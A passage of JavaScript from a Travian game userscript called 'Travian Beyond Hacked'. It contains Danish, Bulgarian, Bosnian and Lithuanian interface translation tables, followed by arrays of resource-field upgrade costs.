	'IGMOUTPUT': 'Vis indholdet af breve',
	'MAXTIME': 'Max tid',
	'LOGIN': 'Login',
	'TT': 'Total view',
	'RESS': 'Betyder',
	'DEP': 'Råstoflager',
	'PC': 'CP',
	'TROP': 'Enheder',
	'MINI': 'lille',
	'ATT': 'Angreb',
	'CONS': 'Bygning',
	'FT': 'Fest',
	'FT1': 'lille fest',
	'FT2': 'stor fest',
	'EXT': 'Udvidelse',
	'IN': 'in',
	'JUGADOR': 'Spiller',
	'HAB': 'Indbygger',
	'COORD': 'Coords',
	'ACCION': 'Angreb',
	'MAPSCAN': 'Scan Map',
	'AID': 'Hjælp',
	'VITS': 'Speed',
	'CAPA': 'Kapacitet',
	'DIST': 'Afstand',
	'MP': 'Til bogmærker ',
	'UPDATE_CHECK': 'Bekræft Version',
	'LAST_VERSION': 'Du bruger den seneste version',
	'NEW_VERSION': 'Der er en ny version tilrådig',
	'UPDATE_NOW': 'Update nu',
	'R1': 'Legionær', // Romans
	'R2': 'Prætorianer',
	'R3': 'Imperianer',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Rambuk',
	'R8': 'Brandkatapult',
	'R9': 'Senator',
	'R10': 'Bosætter',
	'T1': 'Køllesvinger', // Teutons
	'T2': 'Spydkæmper',
	'T3': 'Øksekæmper',
	'T4': 'Spejder',
	'T5': 'Paladin',
	'T6': 'Teutonrytter',
	'T7': 'Rambuk',
	'T8': 'Katapult',
	'T9': 'Stammefører',
	'T10': 'Bosætter',
	'G1': 'Falanks', // Gauls
	'G2': 'Sværdkæmper',
	'G3': 'Spion',
	'G4': 'Theutaterlyn',
	'G5': 'Druiderytter',
	'G6': 'Haeduaner',
	'G7': 'Rambuktræ',
	'G8': 'Krigskatapult',
	'G9': 'Høvding',
	'G10': 'Bosætter',
	'N1': 'Rotte', // Nature
	'N2': 'Edderkop',
	'N3': 'Slange',
	'N4': 'Flagermus',
	'N5': 'Vildsvin',
	'N6': 'Ulv',
	'N7': 'Bjørn',
	'N8': 'Krokodille',
	'N9': 'Tiger',
	'N10': 'Elefant',
	'LVL': 'Trin',			// Very important
	'MARC': 'handelsmænd',		// Very important
	'TOTAL': 'Alt',
	'WASTED_SPACE': 'Wasted Space',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important (0/1)',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text'
	}
	break;
	case "bg":		// Bulgarian translation by Peh
	var newLang = {
	'ALIANZA': 'Клан',
	'SIM': 'Симулатор',
	'SEGURO': 'Сигурни ли сте?',
	'MARK': 'Избери всичко',
	'PERDIDAS': 'Загуби',
	'RENT': 'Приход',
	'SUBIR_NIVEL': 'Възможно надстрояване',
	'ALDEA': 'Град',
	'ATACAR': 'Атака',
	'COMERCIAR': 'Изпрати ресурси',
	'GUARDADO': 'Записано',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Трябват',
	'HOY': 'днес',
	'MANYANA': 'утре',
	'PAS_MANYANA': 'в други ден',
	'MERCADO': 'Пазар',
	'CUARTEL': 'Казарма',
	'PUNTO': 'Сборен пункт',
	'CORRAL': 'Конюшня',
	'TALLER': 'Работиница',
	'ENVIAR': 'Изпрати ресурси',
	'COMPRAR': 'Купи',
	'VENDER': 'Продай',
	'ENVIAR_IGM': 'Изпрати IGM',
	'LISTO': 'Налични',
	'EL': 'на',
	'A_LAS': 'в',
	'EFICIENCIA': 'Ефективност',
	'NUNCA': 'Никога',
	'PC': 'точки културно развитие',
	'FUNDAR': 'Можете да основете или завземете ново село',
	'TIEMPO': 'Време',
	'STAT': 'Статистика',
	'OFREZCO': 'Предлага',
	'BUSCO': 'Търси',
	'TIPO': 'Вид',
	'CUALQUIERA': 'Всякакъв',
	'DISPONIBLE': 'Налични само',
	'SI': 'Да',
	'NO': 'Не',
	'MARCADORES': 'Отметки',
	'ANYADIR': 'Добави',
	'ENLACE': 'URL на новата отметка',
	'TEXTO': 'Текст на новата отметка',
	'ARCHIVE': 'Архивирай',
	'ELIMINAR': 'Изтрий',
	'ACTUALIZAR': 'презареди',
	'REFRESH_INFORMARION': 'Презареди инфо',
	'RESUMEN': 'Общо',
	'RECURSO1': 'Дърво',
	'RECURSO2': 'Глина',
	'RECURSO3': 'Желязо',
	'RECURSO4': 'Жито',
	'ALDEA_EXTRA1': 'Изпрати войска',
	'ALDEA_EXTRA2': 'Изпрари ресурси',
	'ALDEA_EXTRA3': 'Центрирай на картата',
	'ALDEA_EXTRA4': 'View Global on village',
	'ALDEA_EXTRA5': 'Центрирай върху селото',
	'ALDEA_EXTRA6': 'TSU информация',
	'ALDEA_EXTRA6B': 'Travian World Analyzer информация',
	'ALDEA_EXTRA7': 'Информация от Travian-search',
	'ALDEA_EXTRA8': 'Местонахождение на Travmap',
	'ADD_ALL': 'За всички ',
	'DEMO': 'Главна сграда',
	'FRIGO': 'Frigo',
	'TOOLS': 'Разтояние и време',
	'TAB1': 'For location on Travmap (red), your Separate multiple alliances with a comma.(ex: A,B,C)',
	'TAB2': 'Редактирай отметките',
	'TAB3': 'Notepad',
	'TAB4': 'Price Sales Market',
	'TAB5': 'Show Info table means',
	'TAB6': 'Show Info table buildings',
	'TAB7': 'Show meter deposit',
	'TAB8': 'Show Bookmarks build.admin',
	'TAB9': 'Show Bookmarks build.military',
	'TAB10': 'Show Bookmarks build.for improvement',
	'TAB11': 'Show Bookmarks Custom',
	'TAB12': 'Show Bookmarks',
	'TAB13': 'Show Info TSU',
	'TAB13B': 'Show Info Travian World Analyzer',
	'TAB14': 'Show Info Travian-search',
	'TAB15': 'Show N° on building',
	'TAB16': 'Show the content of messages',
	'TAB17': 'Show notepad of messages',
	'TAB18': 'Show Info Travmap',
	'TAB19': 'Show Bookmarks build. Town Hall',
	'TAB20': 'Simplifying the list of links to the left',
	'TAB21': 'Simplifying the summary of villages',
	'TAB22': 'Reposition the summary of villages',
	'TAB23': 'Change Attack: Raid / Normal',
	'TAB24': 'Reposition of meter deposit',
	'TAB25': 'Show total numbers of troops in village (Rallypoint)',
	'TAB26': 'Display overview village table',
	'TAB27': 'Image server private : [ ]<br>Image server travian : [x]',
	'TAB28': 'Insert capital ID (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Show extended icons',
	'TAB30': 'Show Battle Analyse',
	'TAB31': 'Show BBcode Help',
	'CLEAN': ' Изчисти',
	'PAL': 'Дворец',
	'RESI': 'Резиденция',
	'MAN': 'Таверна',
	'USI': 'Ковачница за брони',
	'ARM': 'Ковачница за оръжия',
	'HOT': 'Кметство',
	'IGMTITLE': 'Тема',
	'IGMSENTER': 'изпратил',
	'IGMDATE': 'дата',
	'IGMTIME': 'час',
	'IGMOUTPUT': 'Покажи съдържанието на писмата',
	'MAXTIME': 'Макс време',
	'LOGIN': 'Влизане',
	'TT': 'Общ изглед',
	'RESS': 'Means',
	'DEP': 'Склад',
	'PC': 'КР',
	'TROP': 'Войски',
	'MINI': 'Mini',
	'ATT': 'Атаки',
	'CONS': 'Building',
	'FT': 'Празнество',
	'FT1': 'малко празненство',
	'FT2': 'голямо празненство',
	'EXT': 'Експанзия',
	'IN': 'във',
	'JUGADOR': 'Играч',
	'HAB': 'Популация',
	'COORD': 'Координати',
	'ACCION': 'Действия',
	'MAPSCAN': 'Сканирай картата',
	'AID': 'Помощ',
	'VITS': 'Скорост',
	'CAPA': 'Капацитет',
	'DIST': 'Разтояние',
	'MP': 'Добави отметка ',
	'UPDATE_CHECK': 'нова версия',
	'LAST_VERSION': 'Вие използвате последната версия',
	'NEW_VERSION': 'Има нова версия',
	'UPDATE_NOW': 'Обнови сега',
	'R1': 'Легионер', // Romans
	'R2': 'Преторианец',
	'R3': 'Империан',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Стенобойно Оръдие',
	'R8': 'Огнен катапулт',
	'R9': 'Сенатор',
	'R10': 'Заселник',
	'T1': 'Боец с боздуган', // Teutons
	'T2': 'Копиеносец',
	'T3': 'Боец с брадва',
	'T4': 'Съгледвач',
	'T5': 'Паладин',
	'T6': 'Тевтонски рицар',
	'T7': 'Таран',
	'T8': 'Катапулт',
	'T9': 'Предводител',
	'T10': 'Заселник',
	'G1': 'Фаланга', // Gauls
	'G2': 'Мечоносец',
	'G3': 'Следотърсач',
	'G4': 'Theutates Thunder',
	'G5': 'Друид конник',
	'G6': 'Хедуан',
	'G7': 'Таран',
	'G8': 'Требучет',
	'G9': 'Вожд',
	'G10': 'Заселник',
	'N1': 'Плъх', // Nature
	'N2': 'Паяк',
	'N3': 'Змия',
	'N4': 'Прилеп',
	'N5': 'Глиган',
	'N6': 'Вълк',
	'N7': 'Мечка',
	'N8': 'Крокодил',
	'N9': 'Тигър',
	'N10': 'Слон',
	'LVL': 'ниво',
	'MARC': 'Търговеца',
	'TOTAL': 'Общо',
	'WASTED_SPACE': 'Неизползван капацитет',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
	'SAVEREPORT': 'запиши доклада',
	'ANONYMIZE': 'анонимизирай',
	'LBA0':'Общо атака',
	'LBA2':'Общо защита срещу пехота',
	'LBA3':'Общо защита срещу кавалерия',
	'LBA4':'Общите статистики',
	'LBA5':'Разлика в загубите',
	'LBA6':'Консумация',
	'LBA7':'Точки за героите',
	'LBA9':'Еквивалент на загубата в жито',
	'LBA10':'Номинална консумация на жито от армията',
	'LBA11':'Героя не беше',
	'LBA12':'Герой',
	'LBA13':'Количество на ограбените ресурси',
	'LBA14':'Максимален капацитет на оцелелите',
	'LBA15':'Атакуващ',
	'LBA16':'Защитник'
	}
	break;
	case "ba": //bosnian translation
	var newLang = {
	'ALIANZA': 'Alijansa',
	'SIM': 'simulator borbe',
	'SEGURO': 'Da li ste sigurni?',
	'MARK': 'Izaberi sve',
	'PERDIDAS': 'Izgubljeno resursa',
	'RENT': 'Profit',
	'SUBIR_NIVEL': 'Nadogradnja moguća',
	'ALDEA': 'Ime Sela',
	'ATACAR': 'Napad',
	'COMERCIAR': 'Pošalji resurse',
	'GUARDADO': 'Spašeno',
	'DESP_ABR': 'Pomjeri',
	'FALTA': 'Fali ti',
	'HOY': 'danas',
	'MANYANA': 'sutra',
	'PAS_MANYANA': 'prekosutra',
	'MERCADO': 'Pijaca',
	'CUARTEL': 'Кasarna',
	'PUNTO': 'Мjesto okupljanja',
	'CORRAL': 'Štala',
	'TALLER': 'Radionica',
	'ENVIAR': 'Pošalji resurse',
	'COMPRAR': 'Кupovina',
	'VENDER': 'Prodaja',
	'ENVIAR_IGM': 'Pošalji poruku',
	'LISTO': 'Spremno',
	'EL': 'za',
	'A_LAS': 'u',
	'EFICIENCIA': 'Efikasnost',
	'NUNCA': 'Nikad',
	'PC': 'kulturnih poena',
	'FUNDAR': 'Možete osvojiti ili osnovati novo selo',
	'TIEMPO': 'Vrijeme',
	'STAT': 'Statistika',
	'OFREZCO': 'Nudi',
	'BUSCO': 'Traži',
	'TIPO': 'Tip',
	'CUALQUIERA': 'Sve',
	'DISPONIBLE': 'Samo dostupno',
	'SI': 'Da',
	'NO': 'Ne',
	'MARCADORES': 'Linkovi',
	'ANYADIR': 'Dodaj',
	'ENLACE': 'URL novog linka',
	'TEXTO': 'Ime novog linka',
	'ARCHIVE': 'Аrhiva',
	'ELIMINAR': 'Obriši',
	'ACTUALIZAR': 'оsvježi',
	'REFRESH_INFORMARION': 'Osvježi informacije',
	'RESUMEN': 'Ukupno',
	'RECURSO1': 'drvo',
	'RECURSO2': 'glina',
	'RECURSO3': 'željezo',
	'RECURSO4': 'žito',
	'ALDEA_EXTRA1': 'Pošalji vojsku',
	'ALDEA_EXTRA2': 'Pošalji resurse',
	'ALDEA_EXTRA3': 'Centriraj kartu ovdje',
	'ALDEA_EXTRA4': 'Vidi selo',
	'ALDEA_EXTRA5': 'Centriraj kartu ovdjeе',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Lokacija na Travmap',
	'ADD_ALL': 'Za sve ',
	'DEMO': 'Glavna zgrada',
	'FRIGO': 'Neaktivni',
	'TOOLS': 'Daljine i vremena',
	'TAB1': 'Za prikaz na Travmap možete razdvojiti više alijansi zarezom (npr: A,B,C)',
	'TAB2': 'Еdituj linkove',
	'TAB3': 'Bilježnica',
	'TAB4': 'Prodajne cijene na pijaci',
	'TAB5': 'Info nadogradnje resursa',
	'TAB6': 'Info nadogradnje građevine',
	'TAB7': 'Vrijeme punjenja/pražnjenja skladišta/silosa',
	'TAB8': 'Linkovi na administrativne građevine',
	'TAB9': 'Linkovi na vojne građevine',
	'TAB10': 'Linkovi na građevine za unapređenje',
	'TAB11': 'Prilagođeni linkovi',
	'TAB12': 'Prikaži linkove',
	'TAB13': 'Prikaži info TSU',
	'TAB13B': 'Prikaži info Travian World Analyzer',
	'TAB14': 'Prikaži info Travian-search',
	'TAB15': 'Prikaži stepen građevine',
	'TAB16': 'Prikaži sadržaj poruka',
	'TAB17': 'Prikaži bilježnicu',
	'TAB18': 'Prikaži info Travmap',
	'TAB19': 'Link na Opštinu',
	'TAB20': 'Pojednostavi listu linkova na lijevoj strani',
	'TAB21': 'Pojednostavi ukupni pregled sela',
	'TAB22': 'Premjesti ukupni pregled sela',
	'TAB23': 'Pljačka / Napad',
	'TAB24': 'Premjesti vrijeme punjenja/pražnjenja',
	'TAB25': 'Prikaži ukupan broj trupa iz sela (mjesto okupljanja)',
	'TAB26': 'Prikaži pregled sela',
	'TAB27': 'Slike sa privatnog servera : [ ]<br>Slike sa travian servera : [x]',
	'TAB28': 'Unesi ID glavnog grada ID (npr: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Prikaži dodatne ikone',
	'TAB30': 'Prikaži analizu bitke',
	'TAB31': 'Prikaži pomoć za BBCode',
	'TAB32': 'Prikaži stepen polja/rudnika',
	'TAB33': 'Prikaži NPC pomoć',
	'TAB34': 'Prikaži brzi izvještaj',
	'TAB35': 'Odredi brzinu jedinica za prozor sа daljinama (npr. za senatora: 4)',
	'CLEAN': ' Izbriši',
	'PAL': 'Dvorac',
	'RESI': 'Rezidencija',
	'MAN': 'Herojska vila',
	'USI': 'Kovačnica oklopa',
	'ARM': 'Коvačnica oružja',
	'HOT': 'Оpština',
	'IGMTITLE': 'Тema',
	'IGMSENTER': 'Pošiljalac',
	'IGMDATE': 'datum',
	'IGMTIME': 'vrijeme',
	'IGMOUTPUT': 'Prikaži sadržaj poruka',
	'MAXTIME': 'Мaksimalno vrijeme',
	'LOGIN': 'Ime',
	'TT': 'Pregled',
	'RESS': 'Resursi',
	'DEP': 'Skladište',
	'PC': 'KP',
	'TROP': 'Vojska',
	'MINI': 'Мini',
	'ATT': 'Napad',
	'CONS': 'Izgradnja',
	'FT': 'Zabave',
	'FT1': 'Mala zabava',
	'FT2': 'Velika zabava',
	'EXT': 'Proširenje',
	'IN': '',
	'JUGADOR': 'Igrač',
	'HAB': 'Stanovništvo',
	'COORD': 'Koordinate',
	'ACCION': 'Аkcija',
	'MAPSCAN': 'Pretraži mapu',
	'AID': 'Pomoć',
	'VITS': 'Brzina',
	'CAPA': 'Kapacitet',
	'DIST': 'Daljina',
	'MP': 'Dodaj u linkove',
	'UPDATE_CHECK': 'Provjeri verziju',
	'LAST_VERSION': 'Koristite posljednju verziju',
	'NEW_VERSION': 'Nova verzija je dostupna',
	'UPDATE_NOW': 'Unaprijedi odmah',
	'R1': 'Legionar', // Romans
	'R2': 'Pretorijanac',
	'R3': 'Imperijanac',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Ratni ovan',
	'R8': 'Vatreni katapult',
	'R9': 'Senator',
	'R10': 'Naseljenik',
	'T1': 'Batinar',	// Teutons
	'T2': 'Кopljanik',
	'T3': 'Borac sa sjekirom',
	'T4': 'Izviđač',
	'T5': 'Paladin',
	'T6': 'Teutonski vitez',
	'T7': 'Оvan',
	'T8': 'Каtapult',
	'T9': 'Poglavica',
	'T10': 'Naseljenik',
	'G1': 'Falanga',	// Gauls
	'G2': 'Мačevalac',
	'G3': 'Izviđač',
	'G4': 'Teutateov grom',
	'G5': 'Druidski jahač',
	'G6': 'Heduan',
	'G7': 'Оvan',
	'G8': 'Каtapult',
	'G9': 'Starješina',
	'G10': 'Naseljenik',
	'N1': 'Pacov',	// Nature
	'N2': 'Pauk',
	'N3': 'Zmija',
	'N4': 'Slijepi miš',
	'N5': 'Divlja svinja',
	'N6': 'Vuk',
	'N7': 'Мeđed',
	'N8': 'Кrokodil',
	'N9': 'Тigar',
	'N10': 'Slon',
	'LVL': 'Stepen',		// Very important
	'MARC': 'Тrgovac',		// Very important
	'TOTAL': 'Ukupno',
	'WASTED_SPACE': 'Neiskorišteno',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Važno (0/1)',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Tekst',
	'SAVEREPORT': 'Spasi izvještaj',
	'ANONYMIZE': 'Sakrij podatke',
	'LBA0':'Jačina napada',
	'LBA2':'Ukupna odbrana od pješadije',
	'LBA3':'Ukupna odbrana od konjice',
	'LBA4':'Statistika',
	'LBA5':'Оdnos gubitaka',
	'LBA6':'Potrošnja žita',
	'LBA7':'Iskustvo heroja',
	'LBA9':'Gubitak u žitu',
	'LBA10':'Potrošnja žita za ishranu vojske',
	'LBA11':'Heroj nije dobio ništa',
	'LBA12':'Heroj',
	'LBA13':'Кoličina opljačkanih resursa',
	'LBA14':'Маksimalna količina koju mogu da nose preživjeli',
	'LBA15':'Napadač',
	'LBA16':'Branilac',
	'LBA17': 'Kopiraj i otvori simulator bitke',
	'LBA18': 'Ubaci kopirano',
	'BBC': 'Кorisni BBkodovi',
	'BBC_B': 'Podebljano: [b]Теkst[/b]',
	'BBC_I': 'Коsо: [i]Теkst[/i]',
	'BBC_U': 'Podvučeno: [u]Теkst[/u]',
	'BBC_C': 'Centrirano: [c]Теkst[/c]',
	'BBC_COLOR': 'Boja: [color=blue]Тekst[/color] Tipp: You can use these too: color=#0000FF and #00F',
	'BBC_URL': 'Link: [url]http://url[/url] or [url=http://url]Naziv linka[/url]',
	'BBC_IMG': 'Slika: [img]URL[/img]',
	'THS0': 'Тrenutno iskustvo:',
	'THS1': 'Sljedeći nivo:',
	'THS2': 'Potrebno:'
	}
	break;
	case "lt": // FDisk
	var newLang = {
	'ALIANZA': 'Aljansas',
	'SIM': 'Mūšių simuliatorius',
	'SEGURO': 'Ar tikrai?',
	'MARK': 'Pažymėt visus',
	'PERDIDAS': 'Nuostoliai',
	'RENT': 'Pelnas',
	'SUBIR_NIVEL': 'Galima patobulinti',
	'ALDEA': 'Miesto pavadinimas',
	'ATACAR': 'Atakuoti',
	'COMERCIAR': 'Siųsti resursus',
	'GUARDADO': 'Išsaugotas',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Tau reikia',
	'HOY': 'šiandien',
	'MANYANA': 'rytoj',
	'PAS_MANYANA': 'poryt',
	'MERCADO': 'Turgavietė',
	'CUARTEL': 'Kareivinės',
	'PUNTO': 'Susibūrimų vieta',
	'CORRAL': 'Stable',
	'TALLER': 'Workshop',
	'ENVIAR': 'Siųsti resursus',
	'COMPRAR': 'Pirkti',
	'VENDER': 'Parduotis',
	'ENVIAR_IGM': 'Send IGM',
	'LISTO': 'Galima statyti',
	'EL': 'on',
	'A_LAS': ':',
	'EFICIENCIA': 'Efektyvumas',
	'NUNCA': 'Niekada',
	'PC': 'kultūros taškai',
	'FUNDAR': 'You can found or conquer a new village',
	'TIEMPO': 'Laikas',
	'STAT': 'Statistika',
	'OFREZCO': 'Siūlo',
	'BUSCO': 'Ieško',
	'TIPO': 'Tipas',
	'CUALQUIERA': 'Betkas',
	'DISPONIBLE': 'Betkoks',
	'SI': 'Taip',
	'NO': 'Ne',
	'MARCADORES': 'Nuorodos',
	'ANYADIR': 'Pridėti',
	'ENLACE': 'Naujas URL',
	'TEXTO': 'Nauja žyma',
	'ARCHIVE': 'Archyvas',
	'ELIMINAR': 'Ištrinti',
	'ACTUALIZAR': 'perkrauti',
	'REFRESH_INFORMARION': 'atnaujinti',
	'RESUMEN': 'Statistika',
	'RECURSO1': 'Medis',
	'RECURSO2': 'Molis',
	'RECURSO3': 'Geležis',
	'RECURSO4': 'Grūdai',
	'ALDEA_EXTRA1': 'Siūsti karius',
	'ALDEA_EXTRA2': 'Siūsti resursus',
	'ALDEA_EXTRA3': 'Centruoti žemėlapį',
	'ALDEA_EXTRA4': 'View Global on village',
	'ALDEA_EXTRA5': 'Centering on village',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Location on Travmap',
	'ADD_ALL': 'For all ',
	'DEMO': 'Gyvenamasis pastatas',
	'FRIGO': 'Frigo',
	'TOOLS': 'Atstumas ir laikas',
	'TAB1': 'For location on Travmap (red), your Separate multiple alliances with a comma.(ex: A,B,C)',
	'TAB2': 'Edit its Bookmarks',
	'TAB3': 'Užrašinė',
	'TAB4': 'Price Sales Market',
	'TAB5': 'Show Info table means',
	'TAB6': 'Show Info table buildings',
	'TAB7': 'Show meter deposit',
	'TAB8': 'Show Bookmarks build.admin',
	'TAB9': 'Show Bookmarks build.military',
	'TAB10': 'Show Bookmarks build.for improvement',
	'TAB11': 'Show Bookmarks Custom',
	'TAB12': 'Show Bookmarks',
	'TAB13': 'Show Info TSU',
	'TAB13B': 'Show Info Travian World Analyzer',
	'TAB14': 'Show Info Travian-search',
	'TAB15': 'Show N° on building',
	'TAB16': 'Show the content of messages',
	'TAB17': 'Show notepad of messages',
	'TAB18': 'Show Info Travmap',
	'TAB19': 'Show Bookmarks build. Town Hall',
	'TAB20': 'Simplifying the list of links to the left',
	'TAB21': 'Simplifying the summary of villages',
	'TAB22': 'Reposition the summary of villages',
	'TAB23': 'Change Attack: Raid / Normal',
	'TAB24': 'Reposition of meter deposit',
	'TAB25': 'Show total numbers of troops in village (Rallypoint)',
	'TAB26': 'Display overview village table',
	'TAB27': 'Image server private : [ ]<br>Image server travian : [x]',
	'TAB28': 'Insert capital ID (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Show extended icons',
	'TAB30': 'Show Battle Analyse',
	'TAB31': 'Show BBcode Help',
	'TAB32': 'Show N° on means',
	'TAB33': 'Show NPC Helper',
	'TAB34': 'Show Quick Report',
	'TAB35': 'Speed of your unit for popups (ex for the senator: 4)',
	'CLEAN': ' Clean',
	'PAL': 'Palace',
	'RESI': 'Rezidencija',
	'MAN': 'Karžygio namai',
	'USI': 'Šarvų kalvė',
	'ARM': 'Blacksmith',
	'HOT': 'Town Hall',
	'IGMTITLE': 'Topic',
	'IGMSENTER': 'sender',
	'IGMDATE': 'data',
	'IGMTIME': 'laikas',
	'IGMOUTPUT': 'Show the contents of the letters',
	'MAXTIME': 'Maksimalus laikas',
	'LOGIN': 'Prisijungimas',
	'TT': 'Total view',
	'RESS': 'Means',
	'DEP': 'Warehouse',
	'PC': 'CP',
	'TROP': 'Kariai',
	'MINI': 'Mini',
	'ATT': 'Atakos',
	'CONS': 'Pastatas',
	'FT': 'Šventė',
	'FT1': 'maža šventė',
	'FT2': 'didelė šventė',
	'EXT': 'Extension',
	'IN': 'in',
	'JUGADOR': 'Žaidėjas',
	'HAB': 'Populiacija',
	'COORD': 'Koordinatės',
	'ACCION': 'Veiksmai',
	'MAPSCAN': 'Skanuoti žemėlapį',
	'AID': 'Pagalba',
	'VITS': 'Greitis',
	'CAPA': 'Talpa',
	'DIST': 'Atstumas',
	'MP': 'Įtraukti į adresyną',
	'UPDATE_CHECK': 'Atnaujinimai',
	'LAST_VERSION': 'Jūs naudojate naujasią versiją',
	'NEW_VERSION': 'Yra naujesnė versija',
	'UPDATE_NOW': 'Atnaujinti',
	'R1': 'Legionierius', // Romans
	'R2': 'Pretorionas',
	'R3': 'Imperionas',
	'R4': 'Raitieji legatas',
	'R5': 'Imperatoriaus raitelis',
	'R6': 'Cezario raitelis',
	'R7': 'Mūradaužys',
	'R8': 'Ugninė katapulta',
	'R9': 'Senatorius',
	'R10': 'Romėnų kolonistas',
	'T1': 'Pėstininkas su kuoka', // Teutons
	'T2': 'Ietininkas',
	'T3': 'Pėstininkas su kirviu',
	'T4': 'Žvalgas',
	'T5': 'Paladinas',
	'T6': 'Germanų raitelis',
	'T7': 'Taranas',
	'T8': 'Katapulta',
	'T9': 'Germanų vadas',
	'T10': 'Kolonistas',
	'G1': 'Falanga', // Gauls
	'G2': 'Pėstininkas su kardu',
	'G3': 'Pėdsekys',
	'G4': 'Raitas perkūnas',
	'G5': 'Raitas druidas',
	'G6': 'Raitas hedujas',
	'G7': 'Taranas',
	'G8': 'Trebušetas',
	'G9': 'Kunigaikštis ',
	'G10': 'Galų kolonistas',
	'N1': 'Žiurkė', // Nature
	'N2': 'Voras',
	'N3': 'Serpent',
	'N4': 'Žiurkė',
	'N5': 'Wild boar',
	'N6': 'Vilkas',
	'N7': 'Meška',
	'N8': 'Krokodilas',
	'N9': 'Tigras',
	'N10': 'Dramblys',
	'LVL': 'lygis',			// Very important
	'MARC': 'Merchants',		// Very important
	'TOTAL': 'Viso',
	'WASTED_SPACE': 'Wasted Space',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
	'SAVEREPORT': 'išsaugoti ataskaitą',
	'ANONYMIZE': 'anoniminis',
	'LBA0': 'Total size of attack',
	'LBA2': 'Total size of protection against infantry',
	'LBA3': 'Total size of protection against a cavalry',
	'LBA4': 'The general statistics',
	'LBA5': 'Difference of losses',
	'LBA6': 'Consumption',
	'LBA7': 'Herojaus patirtis',
	'LBA9': 'Equivalent lost in grain',
	'LBA10': 'Nominal consumption of grain by army',
	'LBA11': 'The hero was not',
	'LBA12': 'Karžygys',
	'LBA13': 'Quantity of the carried away raw material',
	'LBA14': 'The maximal capacity survived',
	'LBA15': 'Ataka',
	'LBA16': 'Gynyba',
	'LBA17': 'Copy and go to Combat simulator',
	'LBA18': 'Paste',
	'BBC': 'Galimas BBcodas',
	'BBC_B': 'Paryškinimas: [b]Text[/b]',
	'BBC_I': 'Kursyvas: [i]Text[/i]',
	'BBC_U': 'Pabraukimas: [u]Text[/u]',
	'BBC_C': 'Centravimas: [c]Text[/c]',
	'BBC_COLOR': 'Spalvos: [color=blue]Text[/color] Tipp: You can use these too: color=#0000FF and #00F',
	'BBC_URL': 'Nuoroda: [url]http://url[/url] or [url=http://url]Link text[/url]',
	'BBC_IMG': 'Paveiksliukas: [img]URL[/img]',
	'THS0': 'Partitis:',
	'THS1': 'Kitas lygis:',
	'THS2': 'Reikia:'
	}
	break;
}

	//Makes it use default language as English for non translated words in some languages...
	for(a in newLang)
		aLang[a] = newLang[a];

	// Lenyador - Wood
	var lenyadorCost = [
		[0, 0, 0, 0],
		[40, 100, 50, 60],
		[65, 165, 85, 100],
		[110, 280, 140, 165],
		[185, 465, 235, 280],
		[310, 780, 390, 465],
		[520, 1300, 650, 780],
		[870, 2170, 1085, 1300],
		[1450, 3625, 1810, 2175],
		[2420, 6050, 3025, 3630],
		[4040, 10105, 5050, 6060],
		[6750, 16870, 8435, 10125],
		[11270, 28175, 14090, 16905],
		[18820, 47055, 23525, 28230],
		[31430, 78580, 39290, 47150],
		[52490, 131230, 65615, 78740],
		[87660, 219155, 109575, 131490],
		[146395, 365985, 182995, 219590],
		[244480, 611195, 305600, 366715],
		[408280, 1020695, 510350, 612420],
		[681825, 1704565, 852280, 1022740] // Level 20
	];

	// Barrera - Clay
	var barroCost = [
		[0, 0, 0, 0],
		[80, 40, 80, 50],
		[135, 65, 135, 85],
		[225, 110, 225, 140],
		[375, 185, 375, 235],
		[620, 310, 620, 390],	// Level 5
		[1040, 520, 1040, 650],
		[1735, 870, 1735, 1085],
		[2900, 1450, 2900, 1810],
		[4840, 2420, 4840, 3025],
		[8080, 4040, 8080, 5050],	// Level 10
		[13500, 6750, 13500, 8435],
		[22540, 11270, 22540, 14090],
		[37645, 18820, 37645, 23525],
		[62865, 31430, 62865, 39290],
		[104985, 52490, 104985, 65615],	// Level 15
		[175320, 87660, 175320, 109575],
		[292790, 146395, 292790, 182995],
		[488955, 244480, 488955, 305600],
		[816555, 408280, 816555, 510350],
		[1363650, 681825, 1363650, 852280]	// Level 20
	];

	// Mina de hierro - Iron
	var hierroCost = [
		[0, 0, 0, 0],
		[100, 80, 30, 60],
		[165, 135, 50, 100],
		[280, 225, 85, 165],
		[465, 375, 140, 280],
		[780, 620, 235, 465],	// Level 5
		[1300, 1040, 390, 780],
		[2170, 1735, 650, 1300],
		[3625, 2900, 1085, 2175],
		[6050, 4840, 1815, 3630],
		[10105, 8080, 3030, 6060],	// Level 10
		[16870, 13500, 5060, 10125],
		[28175, 22540, 8455, 16905],
		[47055, 37645, 14115, 28230],
		[78580, 62865, 23575, 47150],
		[131230, 104985, 39370, 78740],	// Level 15
		[219155, 175320, 65745, 131490],
		[365985, 292790, 109795, 219590],
		[611195, 488955, 183360, 366715],
		[1020695, 816555, 306210, 612420],
		[1704565, 1363650, 511370, 1022740]	// Level 20
	];


	// Granja - Crop
	var cerealCost = [
		[0, 0, 0, 0],
		[70, 90, 70, 20],
		[115, 150, 115, 35],
		[195, 250, 195, 55],
		[325, 420, 325, 95],
		[545, 700, 545, 155],	// Level 5
		[910, 1170, 910, 260],
